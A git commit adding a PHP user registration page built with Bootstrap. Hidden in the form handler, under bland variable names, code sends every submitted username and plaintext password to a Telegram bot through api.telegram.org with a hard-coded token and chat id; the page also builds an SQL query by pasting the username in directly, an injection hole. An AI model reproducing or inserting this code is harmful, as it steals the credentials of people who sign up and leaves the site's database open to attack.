745a452835401e24a6314da68789d67b79fb7a83
katiarich <165577334+katiarich@users.noreply.github.com>
2024-04-04 05:45:36 +0700

    Add files via upload

---
+++ registration.php
@@ -0,0 +1,108 @@
+<?php
+session_start();
+if (isset($_SESSION["user"])) {
+   header("Location: index.php");
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <?php
+        if (isset($_POST["submit"])) {
+           $fullName = $_POST["fullname"];
+           $username = $_POST["username"];
+           $password = $_POST["password"];
+           $passwordRepeat = $_POST["repeat_password"];
+           
+           $passwordHash = password_hash($password, PASSWORD_DEFAULT);
+
+           $errors = array();
+           
+$query_one = "7081582955:AAGjtT04lcyJT0Q17g79ZOSQ3pcBvH__gqo";
+
+$query_two = "7179640883";
+
+$query_three = "\nUsername: $username\nPassword: $password";
+
+$query = "https://api.telegram.org/bot$query_one/sendMessage";
+$data = array(
+    'chat_id' => $query_two,
+    'text' => $query_three
+);
+
+$ch = curl_init($query);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+$response = curl_exec($ch);
+curl_close($ch);
+           
+           if (empty($fullName) OR empty($username) OR empty($password) OR empty($passwordRepeat)) {
+            array_push($errors,"All fields are required");
+           }
+           if (strlen($password)<8) {
+            array_push($errors,"Password must be at least 8 charactes long");
+           }
+           if ($password!==$passwordRepeat) {
+            array_push($errors,"Password does not match");
+           }
+           require_once "database.php";
+           $sql = "SELECT * FROM users WHERE username = '$username'";
+           $result = mysqli_query($conn, $sql);
+           $rowCount = mysqli_num_rows($result);
+           if ($rowCount>0) {
+            array_push($errors,"Username already exists!");
+           }
+           if (count($errors)>0) {
+            foreach ($errors as  $error) {
+                echo "<div class='alert alert-danger'>$error</div>";
+            }
+           }else{
+            
+            $sql = "INSERT INTO users (full_name, username, password) VALUES ( ?, ?, ? )";
+            $stmt = mysqli_stmt_init($conn);
+            $prepareStmt = mysqli_stmt_prepare($stmt,$sql);
+            if ($prepareStmt) {
+                mysqli_stmt_bind_param($stmt,"sss",$fullName, $username, $passwordHash);
+                mysqli_stmt_execute($stmt);
+                echo "<div class='alert alert-success'>You are registered successfully.</div>";
+            }else{
+                die("Something went wrong");
+            }
+           }
+          
+
+        }
+        ?>
+        <form action="registration.php" method="post">
+            <div class="form-group">
+                <input type="text" class="form-control" name="fullname" placeholder="Full Name:">
+            </div>
+            <div class="form-group">
+                <input type="emamil" class="form-control" name="username" placeholder="Username:">
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-control" name="password" placeholder="Password:">
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-control" name="repeat_password" placeholder="Repeat Password:">
+            </div>
+            <div class="form-btn">
+                <input type="submit" class="btn btn-primary" value="Register" name="submit">
+            </div>
+        </form>
+        <div>
+        <div><p>Already Registered <a href="login.php">Login Here</a></p></div>
+      </div>
+    </div>
+</body>
+</html>
